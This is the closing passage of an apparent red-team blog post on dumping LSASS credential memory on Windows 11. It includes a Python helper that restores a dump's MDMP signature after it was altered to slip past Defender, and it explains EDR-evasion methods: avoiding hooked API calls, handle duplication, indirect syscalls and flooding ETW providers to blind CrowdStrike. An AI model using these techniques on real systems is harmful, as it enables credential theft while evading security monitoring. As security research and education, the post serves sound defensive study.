    with open(output_file_path, 'wb') as output_file:
        output_file.write(modified_data)
        print(f"Replaced first four bytes with {new_bytes.decode('utf-8')} and saved to file: {output_file_path}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Replace the first four bytes of a file with "MDMP" and save as a new file.')
    parser.add_argument('input_file_path', type=str, help='Path to the input file')
    parser.add_argument('output_file_path', type=str, help='Path to the output file')
    args = parser.parse_args()

    input_file_path = args.input_file_path
    output_file_path = args.output_file_path
    new_bytes = b"MDMP"  # The new bytes to write at the beginning of the file

    replace_first_four_bytes(input_file_path, output_file_path, new_bytes)
```
```bash
python3 fix_signature.py test.txt fixed.dmp
xxd -l 128 test.txt
xxd -l 128 fixed.dmp
```

![](/assets/posts/2024-06-03-LSASS-Dumping-Windows11-Part2/dump_comparison.bmp)


After fixing the signature, we have a valid Minidump file of the LSASS process and can extract sensitive information from it offline. While this method works for bypassing Defender, additional modifications would be needed to evade EDR solutions. One tool designed to make it harder to detect calls to MiniDumpWriteDump for dumping LSASS memory content is Dumpy by Kudaes [https://github.com/Kudaes/Dumpy/tree/main?tab=readme-ov-file](https://github.com/Kudaes/Dumpy/tree/main?tab=readme-ov-file). In this tool, the author uses a Rust implementation of DInvoke and avoids opening a new process handle to LSASS to perform the dump. In our code above, the line IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid); would get flagged by some EDR solutions. There is a useful GitHub repository that shows the different NT API functions that are typically hooked by EDRs [https://github.com/Mr-Un1k0d3r/EDRs](https://github.com/Mr-Un1k0d3r/EDRs). While EDRs have likely hooked more functions recently, this repository provides a good baseline to work with.


![](/assets/posts/2024-06-03-LSASS-Dumping-Windows11-Part2/hooked_calls.bmp)

The GitHub repository documents multiple EDR solutions hooking NtOpenProcess. Since our code directly opens a handle to LSASS, this would definitely be flagged as malicious. Furthermore, Palo Alto Cortex hooks NtOpenProcessToken, which we use to enable the SeDebugPrivilege privilege. Although we are already in an elevated PowerShell session, and this might not be flagged as malicious, the author's implementation uses RtlAdjustPrivilege instead to enable SeDebugPrivilege, which isn't shown as hooked below. Granted, this syscall has been heavily abused recently, so this could have changed.

While the Dumpy implementation avoids the NtOpenProcess and NtOpenProcessToken hooks, we can see that some NT API functions for its implementation are still hooked. This is where the Rust DInvoke port could potentially aid in evading these userland hooks.


![](/assets/posts/2024-06-03-LSASS-Dumping-Windows11-Part2/dumpy_hooked_functions.bmp)


The final example I want to show is from this GitHub repository: [https://github.com/Meowmycks/LetMeowIn/tree/main](https://github.com/Meowmycks/LetMeowIn/tree/main). When this technique was introduced, it was able to bypass Windows Defender, Malwarebytes Anti-Malware, and CrowdStrike Falcon EDR. The author of this technique duplicates the existing LSASS handle instead of opening a new one and also creates an offline copy of the LSASS process to perform the memory dump on. These methods are good for operational security and help maintain stealth while performing the dump.

Some other evasion techniques in this code, which I plan to cover in a later EDR blog, include indirect system calls, polymorphism through compile-time hash generation, and obfuscation of API function names and pointers. The author encountered the same issue where performing the dump didn't trigger an alert, but saving it to disk did. They used a similar technique to my .NET assembly by overwriting the MDMP signature of the binary and restoring it after transferring it to their remote machine.

I am surprised that this code was able to bypass CrowdStrike Falcon because it is one of the better EDR solutions. Using indirect syscalls should still be flagged if the call stacks are checked. This code doesn't do call-stack spoofing, meaning the path for calling the syscall doesn't match the standard Windows convention. I will cover this in more detail in the EDR blog, but the code implements functionality to break telemetry for Event Tracing for Windows (ETW). ETW provides event tracing and logging for events raised by user-mode applications and kernel-mode drivers. Many EDRs analyze Kernel ETW call stacks to check for malicious behavior such as direct or indirect syscalls. If an attacker patches ETW or disrupts telemetry data, it blinds the EDR.

This is why CrowdStrike was unable to detect the indirect syscalls utilized in this code. The Gluttony function in the code maxes out the number of ETW providers a single process can have by calling EventRegister inside a while loop until the maximum number is reached. This is done before CrowdStrike tries to register any legitimate providers, preventing it from receiving telemetry data.


This concludes my blog on some of the latest techniques currently being utilized to perform LSASS dumping on Windows 11. While there are more techniques and new variants emerging, I believe the blog has highlighted some of the more popular methods. I hope this blog has been helpful, and I look forward to returning in the future to delve deeper into the current state of EDR and security evasion techniques. As always, rock on and hack the planet!